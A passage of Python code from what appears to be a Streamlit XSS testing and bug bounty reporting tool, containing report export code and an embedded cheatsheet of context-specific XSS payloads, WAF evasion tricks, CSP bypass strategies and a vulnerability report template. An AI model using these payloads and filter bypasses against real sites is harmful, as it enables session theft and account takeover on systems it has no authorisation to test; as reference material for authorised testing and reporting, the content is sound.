            st.markdown("### Generated Report")
            st.text_area("Copy report:", report, height=400)

            # Download
            b64 = base64.b64encode(report.encode()).decode()
            st.markdown(f'<a href="data:text/markdown;base64,{b64}" download="xss_report_{target_in}.md">📥 Download Report (.md)</a>', unsafe_allow_html=True)

        # Export JSON
        if st.button("📥 Export JSON"):
            j = json.dumps(findings, indent=2)
            b64 = base64.b64encode(j.encode()).decode()
            st.markdown(f'<a href="data:application/json;base64,{b64}" download="xss_findings.json">📥 Download JSON</a>', unsafe_allow_html=True)

        # Export CSV table
        df = pd.DataFrame(findings)
        st.dataframe(df[["severity", "type", "param", "context", "confidence", "url"]].head(50),
                     use_container_width=True)


# ════════════════════════════════════════════════════════
# PAGE: CHEATSHEET
# ════════════════════════════════════════════════════════
elif page == "📖 Cheatsheet":
    st.markdown("## 📖 XSS Cheatsheet")

    tab1, tab2, tab3 = st.tabs(["Context Guide", "WAF Evasion", "Report Writing"])

    with tab1:
        st.markdown("""
### Context Detection Guide

| Where payload lands | Context | Best payload type |
|---|---|---|
| `<div>PAYLOAD</div>` | HTML body | `<script>`, `<img onerror>`, `<svg onload>` |
| `<input value="PAYLOAD">` | Double-quoted attr | `" onmouseover="alert(1)` |
| `<input value='PAYLOAD'>` | Single-quoted attr | `' onmouseover='alert(1)` |
| `<a href="PAYLOAD">` | URL attribute | `javascript:alert(1)` |
| `<script>var x='PAYLOAD'</script>` | JS string | `'-alert(1)-'` or `';alert(1)//` |
| `<script>var x=PAYLOAD</script>` | JS expression | `alert(1)` |
| `<!-- PAYLOAD -->` | HTML comment | `--><script>alert(1)</script>` |
| `<style>PAYLOAD</style>` | CSS context | `</style><script>alert(1)</script>` |

### DOM XSS Sinks
```javascript
// High-risk sinks — if your input reaches these, it's game over:
document.write()
document.writeln()
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()
eval()
setTimeout() / setInterval()  // with string arg
location.href
location.replace()
document.URL / document.referrer  // sources
```

### Quick Test Payloads (by context)
```
# HTML body:        <img src=x onerror=alert(1)>
# Attribute:        " onmouseover="alert(1)" x="
# JavaScript:       '-alert(1)-'
# URL:              javascript:alert(1)
# CSS:              </style><script>alert(1)</script>
# JSON:             "};</script><script>alert(1)</script>
```
""")

    with tab2:
        st.markdown("""
### WAF Evasion Techniques

| Technique | Example |
|---|---|
| Case mutation | `<ScRiPt>alert(1)</ScRiPt>` |
| Tag splitting | `<scr[null]ipt>alert(1)</scr[null]ipt>` |
| Event handler variation | `<img src=x onERROR=alert(1)>` |
| Backtick eval | `<script>alert(1)</script>` (backtick form) |
| Char code | `eval(String.fromCharCode(97,108,101,114,116,40,49,41))` |
| Base64 eval | `eval(atob('YWxlcnQoMSk='))` |
| Concatenation | `window['ale'+'rt'](1)` |
| Optional chaining | `alert?.('xss')` |
| HTML entity in attr | `<img src=x onerror=&#x61;lert(1)>` |
| Double URL encode | `%253Cscript%253Ealert(1)%253C/script%253E` |
| Whitespace bypass | `<svg/onload=alert(1)>` |
| Comment injection | `<scr<!---->ipt>alert(1)</scr<!---->ipt>` |

### CSP Bypass Strategies
```
# If CSP allows 'unsafe-inline':
<script>alert(1)</script>

# If CSP allows a CDN:
<script src="https://allowed-cdn.com/angular.min.js"></script>
{{constructor.constructor('alert(1)')()}}

# JSONP endpoints:
<script src="https://target.com/api/callback?cb=alert(1)"></script>

# script-src 'nonce-xxx' bypass:
# Find nonce in page → inject <script nonce="xxx">alert(1)</script>

# meta tag (if script-src set but no meta-src):
<meta http-equiv="refresh" content="0; url=javascript:alert(1)">
```
""")

    with tab3:
        st.markdown("""
### XSS Report Template

```markdown
## [Component] - Reflected XSS via [parameter]

**CVSS:** CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N — 6.1 (Medium)
**CWE:** CWE-79

## Summary
A reflected XSS vulnerability exists in the [parameter] parameter of [endpoint].
An attacker can inject arbitrary JavaScript that executes in the victim's browser,
enabling session hijacking and account takeover.

## Steps to Reproduce
1. Log in as any user
2. Navigate to: [URL with payload]
3. Observe the alert dialog (JavaScript executed)

## Proof of Concept
```http
GET /search?q="><img src=x onerror=alert(document.domain)> HTTP/1.1
Host: target.com
```

## Impact
An attacker controlling a link can target any authenticated user.
Successful exploitation enables: session token theft, account takeover,
credential phishing, keylogging, and defacement.

## Remediation
1. HTML-encode all user input before rendering (context-aware escaping)
2. Implement Content-Security-Policy header
3. Set X-XSS-Protection: 1; mode=block (legacy browsers)
```

### Severity Framing Tips
- **DOM + cookie exfil = Critical** (not just Medium)
- Show `document.cookie` in alert, not just `alert(1)`
- Document the auth context (unauthenticated vs authenticated)
- Chain with CSRF if possible → escalate impact
- If stored XSS hits admin panel → CRITICAL
""")
